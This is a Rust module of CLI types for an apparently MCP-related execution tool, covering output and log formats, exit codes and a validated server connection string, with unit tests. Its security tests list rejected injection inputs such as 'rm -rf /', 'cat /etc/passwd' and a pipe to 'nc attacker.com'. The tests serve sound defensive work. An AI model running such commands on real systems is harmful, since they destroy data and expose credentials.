//! CLI-specific types and utilities.
//!
//! This module provides strong types for CLI concepts following Microsoft Rust
//! Guidelines, ensuring type safety and clear intent throughout the CLI codebase.
//!
//! # Design Principles
//!
//! - Strong types over primitives (no raw strings/ints for domain concepts)
//! - All types are `Send + Sync + Debug`
//! - Validation at construction boundaries
//! - User-friendly error messages
//!
//! # Examples
//!
//! ```
//! use mcp_execution_core::cli::{OutputFormat, ExitCode, ServerConnectionString};
//! use std::path::PathBuf;
//!
//! // Output format selection
//! let format = OutputFormat::Pretty;
//! assert_eq!(format.as_str(), "pretty");
//!
//! // Exit codes with semantic meaning
//! let code = ExitCode::SUCCESS;
//! assert_eq!(code.as_i32(), 0);
//!
//! // Validated server connection strings
//! let conn = ServerConnectionString::new("github").unwrap();
//! assert_eq!(conn.as_str(), "github");
//! ```

use std::fmt;
use std::str::FromStr;

/// CLI output format.
///
/// Determines how command results are formatted for user display.
/// All formats provide the same information but with different presentation.
///
/// # Examples
///
/// ```
/// use mcp_execution_core::cli::OutputFormat;
///
/// let format = OutputFormat::Json;
/// assert_eq!(format.as_str(), "json");
///
/// let format: OutputFormat = "pretty".parse().unwrap();
/// assert_eq!(format, OutputFormat::Pretty);
/// ```
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Default)]
#[non_exhaustive]
pub enum OutputFormat {
    /// JSON output for machine parsing
    Json,
    /// Plain text output for scripts
    Text,
    /// Pretty-printed output with colors for human reading
    #[default]
    Pretty,
}

impl OutputFormat {
    /// Returns the string representation of the format.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::OutputFormat;
    ///
    /// assert_eq!(OutputFormat::Json.as_str(), "json");
    /// assert_eq!(OutputFormat::Text.as_str(), "text");
    /// assert_eq!(OutputFormat::Pretty.as_str(), "pretty");
    /// ```
    #[must_use]
    pub const fn as_str(&self) -> &'static str {
        match self {
            Self::Json => "json",
            Self::Text => "text",
            Self::Pretty => "pretty",
        }
    }
}

impl fmt::Display for OutputFormat {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

impl FromStr for OutputFormat {
    type Err = crate::Error;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "json" => Ok(Self::Json),
            "text" => Ok(Self::Text),
            "pretty" => Ok(Self::Pretty),
            _ => Err(crate::Error::InvalidArgument(format!(
                "invalid output format: '{s}' (expected: json, text, or pretty)"
            ))),
        }
    }
}

/// CLI exit code with semantic meaning.
///
/// Provides type-safe exit codes following Unix conventions.
/// Success is 0, errors are non-zero with specific meanings.
///
/// # Examples
///
/// ```
/// use mcp_execution_core::cli::ExitCode;
///
/// let code = ExitCode::SUCCESS;
/// assert_eq!(code.as_i32(), 0);
/// assert!(code.is_success());
///
/// let code = ExitCode::from_i32(1).unwrap();
/// assert!(!code.is_success());
///
/// // Outside the valid process exit code range (0..=255) is rejected.
/// assert!(ExitCode::from_i32(-1).is_none());
/// assert!(ExitCode::from_i32(256).is_none());
/// ```
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct ExitCode(i32);

impl ExitCode {
    /// Successful execution (exit code 0).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::SUCCESS.as_i32(), 0);
    /// ```
    pub const SUCCESS: Self = Self(0);

    /// General error (exit code 1).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::ERROR.as_i32(), 1);
    /// ```
    pub const ERROR: Self = Self(1);

    /// Invalid input or arguments (exit code 2).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::INVALID_INPUT.as_i32(), 2);
    /// ```
    pub const INVALID_INPUT: Self = Self(2);

    /// Server connection or communication error (exit code 3).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::SERVER_ERROR.as_i32(), 3);
    /// ```
    pub const SERVER_ERROR: Self = Self(3);

    /// Execution timeout or resource limit exceeded (exit code 4).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::TIMEOUT.as_i32(), 4);
    /// ```
    pub const TIMEOUT: Self = Self(4);

    /// A check ran to completion and found problems, e.g. drift or a broken saved script (exit
    /// code 5).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::CHECK_FAILED.as_i32(), 5);
    /// ```
    pub const CHECK_FAILED: Self = Self(5);

    /// A script run by `run` exited non-zero or was killed by a signal (exit code 6).
    ///
    /// Distinct from the runner's own failure codes, so a script's `process.exit(4)` can never
    /// be mistaken for a runner timeout.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::SCRIPT_FAILED.as_i32(), 6);
    /// ```
    pub const SCRIPT_FAILED: Self = Self(6);

    /// The runner was stopped by SIGINT (exit code 130, `128 + 2`).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::INTERRUPTED.as_i32(), 130);
    /// ```
    pub const INTERRUPTED: Self = Self(130);

    /// The runner was stopped by SIGTERM (exit code 143, `128 + 15`).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::TERMINATED.as_i32(), 143);
    /// ```
    pub const TERMINATED: Self = Self(143);

    /// The runner was stopped by SIGHUP (exit code 129, `128 + 1`).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::HANGUP.as_i32(), 129);
    /// ```
    pub const HANGUP: Self = Self(129);

    /// The runner was stopped by SIGQUIT (exit code 131, `128 + 3`).
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::QUIT.as_i32(), 131);
    /// ```
    pub const QUIT: Self = Self(131);

    /// Creates an exit code from an integer value.
    ///
    /// Returns `None` if `code` falls outside `0..=255`. This is not a universal OS-level
    /// ceiling — on Unix, `std::process::exit` truncates its argument to the low 8 bits, but
    /// on Windows it delivers the full `i32` to the parent process via `ExitProcess` — so
    /// `0..=255` is this API's own deliberate choice (matching every named const this type
    /// already defines, and the conventional Unix exit-code range this CLI targets), not
    /// something every platform enforces for it. Rejecting an out-of-range value here surfaces
    /// a construction mistake immediately rather than silently producing an [`ExitCode`] whose
    /// reported value could be misleading once actually reported to the OS.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// let code = ExitCode::from_i32(0).unwrap();
    /// assert_eq!(code, ExitCode::SUCCESS);
    ///
    /// assert!(ExitCode::from_i32(-1).is_none());
    /// assert!(ExitCode::from_i32(256).is_none());
    /// ```
    #[must_use]
    pub const fn from_i32(code: i32) -> Option<Self> {
        if matches!(code, 0..=255) {
            Some(Self(code))
        } else {
            None
        }
    }

    /// Returns the exit code as an integer.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::SUCCESS.as_i32(), 0);
    /// assert_eq!(ExitCode::ERROR.as_i32(), 1);
    /// ```
    #[must_use]
    pub const fn as_i32(&self) -> i32 {
        self.0
    }

    /// Checks if the exit code represents success.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ExitCode;
    ///
    /// assert!(ExitCode::SUCCESS.is_success());
    /// assert!(!ExitCode::ERROR.is_success());
    /// ```
    #[must_use]
    pub const fn is_success(&self) -> bool {
        self.0 == 0
    }
}

impl Default for ExitCode {
    fn default() -> Self {
        Self::SUCCESS
    }
}

impl From<ExitCode> for i32 {
    fn from(code: ExitCode) -> Self {
        code.0
    }
}

impl fmt::Display for ExitCode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

/// Diagnostic log output format.
///
/// Selects whether `mcp-execution-cli` and `mcp-execution-server` emit human-readable text logs
/// or structured JSON logs. Independent of [`OutputFormat`], which controls command *result*
/// output, not diagnostic logging.
///
/// # Examples
///
/// ```
/// use mcp_execution_core::cli::LogFormat;
///
/// let format = LogFormat::Json;
/// assert_eq!(format.as_str(), "json");
///
/// let format: LogFormat = "TEXT".parse().unwrap();
/// assert_eq!(format, LogFormat::Text);
/// ```
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Default)]
#[non_exhaustive]
pub enum LogFormat {
    /// Human-readable text logs.
    #[default]
    Text,
    /// Structured JSON logs, one object per line.
    Json,
}

impl LogFormat {
    /// Returns the string representation of the format.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::LogFormat;
    ///
    /// assert_eq!(LogFormat::Text.as_str(), "text");
    /// assert_eq!(LogFormat::Json.as_str(), "json");
    /// ```
    #[must_use]
    pub const fn as_str(&self) -> &'static str {
        match self {
            Self::Text => "text",
            Self::Json => "json",
        }
    }

    /// Resolves the effective log format from an optional CLI flag value and an optional raw
    /// environment variable value.
    ///
    /// Precedence: `flag` wins unconditionally when set — `env_value` is not even inspected, so a
    /// malformed environment value has no effect on the result once the flag has already resolved
    /// the format. Otherwise the env value is parsed via [`LogFormat::parse_env`], which treats
    /// an empty/whitespace-only or unrecognized value alike as "no override" and falls back to
    /// [`LogFormat::default`].
    ///
    /// Returns only the resolved format, not the rejected raw value: neither production caller
    /// logs it (a raw `MCP_EXECUTION_LOG_FORMAT` value is untrusted external input, and echoing
    /// it — even truncated — would open a log-injection vector), so carrying it through this
    /// return type would be a capability with no real consumer. A caller that needs to know
    /// *whether* the env value was invalid specifically (as opposed to merely absent), e.g. to
    /// decide whether to log a warning, calls [`LogFormat::is_invalid_env_value`] separately.
    ///
    /// Deliberately free of `std::env` access itself: callers pass
    /// `std::env::var(LOG_FORMAT_ENV_VAR).ok()` in, which keeps precedence and fallback behavior
    /// testable without mutating process environment state. One accepted consequence of that
    /// call shape: a non-UTF-8 `MCP_EXECUTION_LOG_FORMAT` value folds to `Err(VarError::NotUnicode(_))`,
    /// hence `None` here, so it is silently treated as *unset* rather than *invalid* — unlike a
    /// valid-UTF-8 but unrecognized value (e.g. `"xml"`), which [`LogFormat::is_invalid_env_value`]
    /// does flag for a caller to warn about. Not worth switching callers to `std::env::var_os` to
    /// close this gap: a non-UTF-8 value is exceedingly unlikely for a variable whose only valid
    /// values are ASCII, and the failure mode (no warning, falls back to the same default a bad
    /// value would) is identical either way.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::LogFormat;
    ///
    /// // The flag wins even over a valid env value.
    /// assert_eq!(LogFormat::resolve(Some(LogFormat::Json), Some("text")), LogFormat::Json);
    ///
    /// // No flag: a valid env value is used, case-insensitively.
    /// assert_eq!(LogFormat::resolve(None, Some("JSON")), LogFormat::Json);
    ///
    /// // No flag, unrecognized env value: falls back to the default (`Text`).
    /// assert_eq!(LogFormat::resolve(None, Some("xml")), LogFormat::Text);
    /// ```
    #[must_use]
    pub fn resolve(flag: Option<Self>, env_value: Option<&str>) -> Self {
        flag.or_else(|| env_value.and_then(Self::parse_env))
            .unwrap_or_default()
    }

    /// Parses a raw `MCP_EXECUTION_LOG_FORMAT` environment-variable value.
    ///
    /// Returns `None` uniformly for an empty/whitespace-only value and for one that doesn't
    /// match `text`/`json` (case-insensitive) — both are "no override" as far as [`resolve`]
    /// is concerned. Use [`LogFormat::is_invalid_env_value`] when the two `None` cases need to
    /// be told apart (e.g. to decide whether a caller should warn about a rejected value).
    ///
    /// [`resolve`]: LogFormat::resolve
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::LogFormat;
    ///
    /// assert_eq!(LogFormat::parse_env("json"), Some(LogFormat::Json));
    /// assert_eq!(LogFormat::parse_env("JSON"), Some(LogFormat::Json));
    /// assert_eq!(LogFormat::parse_env(""), None);
    /// assert_eq!(LogFormat::parse_env("   "), None);
    /// assert_eq!(LogFormat::parse_env("xml"), None);
    /// ```
    #[must_use]
    pub fn parse_env(raw: &str) -> Option<Self> {
        let trimmed = raw.trim();
        if trimmed.is_empty() {
            return None;
        }
        trimmed.parse().ok()
    }

    /// True when `raw` is a genuinely invalid `MCP_EXECUTION_LOG_FORMAT` value — non-empty and
    /// not parseable via [`LogFormat::parse_env`] — as opposed to an empty/whitespace-only value,
    /// which is merely "unset" and not worth warning about. Lets a caller decide whether to emit
    /// a warning without re-implementing [`parse_env`](LogFormat::parse_env)'s own emptiness
    /// check.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::LogFormat;
    ///
    /// assert!(LogFormat::is_invalid_env_value("xml"));
    /// assert!(!LogFormat::is_invalid_env_value("json"));
    /// assert!(!LogFormat::is_invalid_env_value(""));
    /// assert!(!LogFormat::is_invalid_env_value("   "));
    /// ```
    #[must_use]
    pub fn is_invalid_env_value(raw: &str) -> bool {
        !raw.trim().is_empty() && Self::parse_env(raw).is_none()
    }
}

impl fmt::Display for LogFormat {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

impl FromStr for LogFormat {
    type Err = crate::Error;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "text" => Ok(Self::Text),
            "json" => Ok(Self::Json),
            _ => Err(crate::Error::InvalidArgument(format!(
                "invalid log format: '{s}' (expected: text or json)"
            ))),
        }
    }
}

/// Level to which the workspace binaries cap `rmcp`'s own `tracing` targets.
///
/// `rmcp`'s transport layer logs raw, unsanitized peer input at `debug` level (for example the
/// parse-failure line of `rmcp::transport::async_rw` embeds the offending line verbatim), and
/// both binaries talk to untrusted MCP peers. Capping the bare `rmcp` target keeps a broad
/// `debug` filter (`--verbose`, `RUST_LOG=debug`) from streaming that text into the log (#421).
/// A *more specific* target such as `RUST_LOG=rmcp::transport=debug` still wins over the cap,
/// which is the escape hatch; an equally specific `RUST_LOG=rmcp=debug` is replaced by it.
///
/// The type carries no `tracing` types, so `mcp-execution-core` stays free of that dependency:
/// each binary feeds [`directive`](Self::directive) to its own `EnvFilter`. It is
/// workspace-internal and not part of the documented 1.0 API.
///
/// # Examples
///
/// ```
/// use mcp_execution_core::cli::RmcpLogCap;
///
/// assert_eq!(RmcpLogCap::Warn.directive(), "rmcp=warn");
/// ```
#[doc(hidden)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum RmcpLogCap {
    /// Cap `rmcp` at `info`.
    Info,
    /// Cap `rmcp` at `warn`.
    Warn,
}

impl RmcpLogCap {
    /// The `tracing` filter directive that applies this cap, always a valid directive.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::RmcpLogCap;
    ///
    /// assert_eq!(RmcpLogCap::Info.directive(), "rmcp=info");
    /// ```
    #[must_use]
    pub const fn directive(self) -> &'static str {
        match self {
            Self::Info => "rmcp=info",
            Self::Warn => "rmcp=warn",
        }
    }
}

/// Environment variable consulted for the default [`LogFormat`] when `--log-format` is not
/// passed. See [`LogFormat::resolve`].
pub const LOG_FORMAT_ENV_VAR: &str = "MCP_EXECUTION_LOG_FORMAT";

/// Validated MCP server connection string.
///
/// Ensures server identifiers are non-empty and contain only valid characters.
/// This prevents command injection and path traversal attacks.
///
/// # Security
///
/// - Rejects empty strings
/// - Rejects strings with null bytes
/// - Trims whitespace
///
/// # Examples
///
/// ```
/// use mcp_execution_core::cli::ServerConnectionString;
///
/// let conn = ServerConnectionString::new("github").unwrap();
/// assert_eq!(conn.as_str(), "github");
///
/// // Empty strings are rejected
/// assert!(ServerConnectionString::new("").is_err());
///
/// // Whitespace is trimmed
/// let conn = ServerConnectionString::new("  server  ").unwrap();
/// assert_eq!(conn.as_str(), "server");
/// ```
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct ServerConnectionString(String);

impl ServerConnectionString {
    /// Creates a new validated server connection string.
    ///
    /// # Security
    ///
    /// This function validates input to prevent command injection attacks:
    /// - Only allows alphanumeric characters and `-_./:` for safe server identifiers
    /// - Rejects shell metacharacters (`&`, `|`, `;`, `$`, `` ` ``, etc.)
    /// - Rejects control characters to prevent CRLF injection
    /// - Length limited to 256 characters
    ///
    /// # Errors
    ///
    /// Returns an error if:
    /// - The string is empty after trimming
    /// - The string contains invalid characters
    /// - The string contains control characters
    /// - The string exceeds 256 characters
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ServerConnectionString;
    ///
    /// let conn = ServerConnectionString::new("my-server")?;
    /// assert_eq!(conn.as_str(), "my-server");
    ///
    /// // Shell metacharacters are rejected for security
    /// assert!(ServerConnectionString::new("server && rm -rf /").is_err());
    /// # Ok::<(), mcp_execution_core::Error>(())
    /// ```
    pub fn new(s: impl Into<String>) -> crate::Result<Self> {
        // Define allowed characters: alphanumeric, hyphen, underscore, dot, slash, colon
        // This prevents command injection while allowing common server identifiers
        const ALLOWED_CHARS: &str =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./:";

        let s = s.into();

        // Check for control characters BEFORE trimming to prevent CRLF injection
        if s.chars().any(|c| c.is_control() && c != ' ') {
            return Err(crate::Error::InvalidArgument(
                "server connection string cannot contain control characters".to_string(),
            ));
        }

        let trimmed = s.trim();

        if trimmed.is_empty() {
            return Err(crate::Error::InvalidArgument(
                "server connection string cannot be empty".to_string(),
            ));
        }

        // Reject shell metacharacters to prevent command injection
        if !trimmed.chars().all(|c| ALLOWED_CHARS.contains(c)) {
            return Err(crate::Error::InvalidArgument(
                "server connection string contains invalid characters (allowed: a-z, A-Z, 0-9, -, _, ., /, :)".to_string(),
            ));
        }

        if trimmed.len() > 256 {
            return Err(crate::Error::InvalidArgument(
                "server connection string too long (max 256 characters)".to_string(),
            ));
        }

        Ok(Self(trimmed.to_string()))
    }

    /// Returns the connection string as a string slice.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_execution_core::cli::ServerConnectionString;
    ///
    /// let conn = ServerConnectionString::new("server")?;
    /// assert_eq!(conn.as_str(), "server");
    /// # Ok::<(), mcp_execution_core::Error>(())
    /// ```
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for ServerConnectionString {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl FromStr for ServerConnectionString {
    type Err = crate::Error;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Self::new(s)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_exit_codes_are_distinct_and_in_range() {
        let codes = [
            ExitCode::SUCCESS,
            ExitCode::ERROR,
            ExitCode::INVALID_INPUT,
            ExitCode::SERVER_ERROR,
            ExitCode::TIMEOUT,
            ExitCode::CHECK_FAILED,
            ExitCode::SCRIPT_FAILED,
        ];
        for (i, code) in codes.iter().enumerate() {
            assert_eq!(usize::try_from(code.as_i32()).unwrap(), i);
            assert_eq!(ExitCode::from_i32(code.as_i32()), Some(*code));
        }
    }

    #[test]
    fn test_signal_exit_codes_are_128_plus_the_signal_number() {
        for (code, signal) in [
            (ExitCode::HANGUP, 1),
            (ExitCode::INTERRUPTED, 2),
            (ExitCode::QUIT, 3),
            (ExitCode::TERMINATED, 15),
        ] {
            assert_eq!(code.as_i32(), 128 + signal);
            assert_eq!(ExitCode::from_i32(code.as_i32()), Some(code));
        }
    }

    // OutputFormat tests
    #[test]
    fn test_output_format_as_str() {
        assert_eq!(OutputFormat::Json.as_str(), "json");
        assert_eq!(OutputFormat::Text.as_str(), "text");
        assert_eq!(OutputFormat::Pretty.as_str(), "pretty");
    }

    #[test]
    fn test_output_format_default() {
        assert_eq!(OutputFormat::default(), OutputFormat::Pretty);
    }

    #[test]
    fn test_output_format_from_str_valid() {
        assert_eq!("json".parse::<OutputFormat>().unwrap(), OutputFormat::Json);
        assert_eq!("text".parse::<OutputFormat>().unwrap(), OutputFormat::Text);
        assert_eq!(
            "pretty".parse::<OutputFormat>().unwrap(),
            OutputFormat::Pretty
        );

        // Case insensitive
        assert_eq!("JSON".parse::<OutputFormat>().unwrap(), OutputFormat::Json);
        assert_eq!("TEXT".parse::<OutputFormat>().unwrap(), OutputFormat::Text);
        assert_eq!(
            "PRETTY".parse::<OutputFormat>().unwrap(),
            OutputFormat::Pretty
        );
    }

    #[test]
    fn test_output_format_from_str_invalid() {
        assert!("invalid".parse::<OutputFormat>().is_err());
        assert!("".parse::<OutputFormat>().is_err());
        assert!("xml".parse::<OutputFormat>().is_err());
    }

    #[test]
    fn test_output_format_display() {
        assert_eq!(OutputFormat::Json.to_string(), "json");
        assert_eq!(OutputFormat::Text.to_string(), "text");
        assert_eq!(OutputFormat::Pretty.to_string(), "pretty");
    }

    // ExitCode tests
    #[test]
    fn test_exit_code_constants() {
        assert_eq!(ExitCode::SUCCESS.as_i32(), 0);
        assert_eq!(ExitCode::ERROR.as_i32(), 1);
        assert_eq!(ExitCode::INVALID_INPUT.as_i32(), 2);
        assert_eq!(ExitCode::SERVER_ERROR.as_i32(), 3);
        assert_eq!(ExitCode::TIMEOUT.as_i32(), 4);
    }

    #[test]
    fn test_exit_code_from_i32() {
        assert_eq!(ExitCode::from_i32(0), Some(ExitCode::SUCCESS));
        assert_eq!(ExitCode::from_i32(1), Some(ExitCode::ERROR));
        assert_eq!(ExitCode::from_i32(42).unwrap().as_i32(), 42);
    }

    #[test]
    fn test_exit_code_from_i32_rejects_out_of_range() {
        assert_eq!(ExitCode::from_i32(-1), None);
        assert_eq!(ExitCode::from_i32(256), None);
        assert_eq!(ExitCode::from_i32(i32::MIN), None);
        assert_eq!(ExitCode::from_i32(i32::MAX), None);
    }

    #[test]
    fn test_exit_code_from_i32_accepts_boundaries() {
        assert_eq!(ExitCode::from_i32(0).unwrap().as_i32(), 0);
        assert_eq!(ExitCode::from_i32(255).unwrap().as_i32(), 255);
    }

    #[test]
    fn test_exit_code_is_success() {
        assert!(ExitCode::SUCCESS.is_success());
        assert!(!ExitCode::ERROR.is_success());
        assert!(!ExitCode::INVALID_INPUT.is_success());
        assert!(!ExitCode::from_i32(42).unwrap().is_success());
    }

    #[test]
    fn test_exit_code_default() {
        assert_eq!(ExitCode::default(), ExitCode::SUCCESS);
    }

    #[test]
    fn test_exit_code_into_i32() {
        let code = ExitCode::ERROR;
        let value: i32 = code.into();
        assert_eq!(value, 1);
    }

    #[test]
    fn test_exit_code_display() {
        assert_eq!(ExitCode::SUCCESS.to_string(), "0");
        assert_eq!(ExitCode::ERROR.to_string(), "1");
    }

    // LogFormat tests
    #[test]
    fn test_log_format_as_str() {
        assert_eq!(LogFormat::Text.as_str(), "text");
        assert_eq!(LogFormat::Json.as_str(), "json");
    }

    #[test]
    fn test_log_format_default() {
        assert_eq!(LogFormat::default(), LogFormat::Text);
    }

    #[test]
    fn test_log_format_from_str_valid_case_insensitive() {
        assert_eq!("text".parse::<LogFormat>().unwrap(), LogFormat::Text);
        assert_eq!("JSON".parse::<LogFormat>().unwrap(), LogFormat::Json);
        assert_eq!("Json".parse::<LogFormat>().unwrap(), LogFormat::Json);
    }

    #[test]
    fn test_log_format_from_str_invalid() {
        assert!("xml".parse::<LogFormat>().is_err());
        assert!("".parse::<LogFormat>().is_err());
    }

    #[test]
    fn test_log_format_display() {
        assert_eq!(LogFormat::Text.to_string(), "text");
        assert_eq!(LogFormat::Json.to_string(), "json");
    }

    #[test]
    fn test_log_format_resolve_flag_wins_over_valid_env() {
        assert_eq!(
            LogFormat::resolve(Some(LogFormat::Json), Some("text")),
            LogFormat::Json
        );
    }

    #[test]
    fn test_log_format_resolve_flag_wins_over_bad_env() {
        assert_eq!(
            LogFormat::resolve(Some(LogFormat::Text), Some("xml")),
            LogFormat::Text
        );
    }

    #[test]
    fn test_log_format_resolve_env_used_when_flag_none() {
        assert_eq!(LogFormat::resolve(None, Some("json")), LogFormat::Json);
    }

    #[test]
    fn test_log_format_resolve_env_case_insensitive() {
        assert_eq!(LogFormat::resolve(None, Some("JSON")), LogFormat::Json);
    }

    #[test]
    fn test_log_format_resolve_no_flag_no_env_defaults_to_text() {
        assert_eq!(LogFormat::resolve(None, None), LogFormat::Text);
    }

    #[test]
    fn test_log_format_resolve_empty_or_whitespace_env_treated_as_unset() {
        assert_eq!(LogFormat::resolve(None, Some("")), LogFormat::Text);
        assert_eq!(LogFormat::resolve(None, Some("   ")), LogFormat::Text);
    }

    #[test]
    fn test_log_format_resolve_unknown_env_falls_back_to_default() {
        assert_eq!(LogFormat::resolve(None, Some("xml")), LogFormat::Text);
    }

    // LogFormat::parse_env tests
    #[test]
    fn test_log_format_parse_env_valid_case_insensitive() {
        assert_eq!(LogFormat::parse_env("text"), Some(LogFormat::Text));
        assert_eq!(LogFormat::parse_env("JSON"), Some(LogFormat::Json));
        assert_eq!(LogFormat::parse_env("Json"), Some(LogFormat::Json));
    }

    #[test]
    fn test_log_format_parse_env_empty_or_whitespace_is_none() {
        assert_eq!(LogFormat::parse_env(""), None);
        assert_eq!(LogFormat::parse_env("   "), None);
    }

    #[test]
    fn test_log_format_parse_env_invalid_is_none() {
        assert_eq!(LogFormat::parse_env("xml"), None);
    }

    // LogFormat::is_invalid_env_value tests
    #[test]
    fn test_log_format_is_invalid_env_value_true_for_unparseable_non_empty_value() {
        assert!(LogFormat::is_invalid_env_value("xml"));
    }

    #[test]
    fn test_log_format_is_invalid_env_value_false_for_valid_value() {
        assert!(!LogFormat::is_invalid_env_value("json"));
        assert!(!LogFormat::is_invalid_env_value("TEXT"));
    }

    #[test]
    fn test_log_format_is_invalid_env_value_false_for_empty_or_whitespace() {
        assert!(!LogFormat::is_invalid_env_value(""));
        assert!(!LogFormat::is_invalid_env_value("   "));
    }

    // ServerConnectionString tests
    #[test]
    fn test_server_connection_string_valid() {
        let conn = ServerConnectionString::new("github").unwrap();
        assert_eq!(conn.as_str(), "github");

        let conn = ServerConnectionString::new("my-server-123").unwrap();
        assert_eq!(conn.as_str(), "my-server-123");
    }

    #[test]
    fn test_server_connection_string_trims_whitespace() {
        let conn = ServerConnectionString::new("  server  ").unwrap();
        assert_eq!(conn.as_str(), "server");

        // Control characters (other than space) are rejected before trimming
        assert!(ServerConnectionString::new("\tserver\n").is_err());
    }

    #[test]
    fn test_server_connection_string_rejects_empty() {
        assert!(ServerConnectionString::new("").is_err());
        assert!(ServerConnectionString::new("   ").is_err());
        assert!(ServerConnectionString::new("\t\n").is_err());
    }

    #[test]
    fn test_server_connection_string_from_str() {
        let conn: ServerConnectionString = "server".parse().unwrap();
        assert_eq!(conn.as_str(), "server");

        assert!("".parse::<ServerConnectionString>().is_err());
    }

    #[test]
    fn test_server_connection_string_display() {
        let conn = ServerConnectionString::new("test-server").unwrap();
        assert_eq!(conn.to_string(), "test-server");
    }

    // Security tests for command injection prevention
    #[test]
    fn test_server_connection_string_command_injection() {
        // Shell metacharacters should be rejected
        assert!(ServerConnectionString::new("server && rm -rf /").is_err());
        assert!(ServerConnectionString::new("server; cat /etc/passwd").is_err());
        assert!(ServerConnectionString::new("server | nc attacker.com").is_err());
        assert!(ServerConnectionString::new("server $(malicious)").is_err());
        assert!(ServerConnectionString::new("server `whoami`").is_err());
        assert!(ServerConnectionString::new("server & background").is_err());
    }

    #[test]
    fn test_server_connection_string_control_chars() {
        // Control characters should be rejected (CRLF injection)
        assert!(ServerConnectionString::new("server\r\n").is_err());
        assert!(ServerConnectionString::new("server\0").is_err());
        assert!(ServerConnectionString::new("server\t").is_err());
    }

    #[test]
    fn test_server_connection_string_valid_chars() {
        // These should still be valid
        assert!(ServerConnectionString::new("github").is_ok());
        assert!(ServerConnectionString::new("my_server").is_ok());
        assert!(ServerConnectionString::new("server-123").is_ok());
        assert!(ServerConnectionString::new("localhost:8080").is_ok());
        assert!(ServerConnectionString::new("example.com/path").is_ok());
    }

    #[test]
    fn test_server_connection_string_length_limit() {
        // 256 characters should be allowed
        let valid = "a".repeat(256);
        assert!(ServerConnectionString::new(&valid).is_ok());

        // 257 characters should be rejected
        let too_long = "a".repeat(257);
        assert!(ServerConnectionString::new(&too_long).is_err());
    }
}
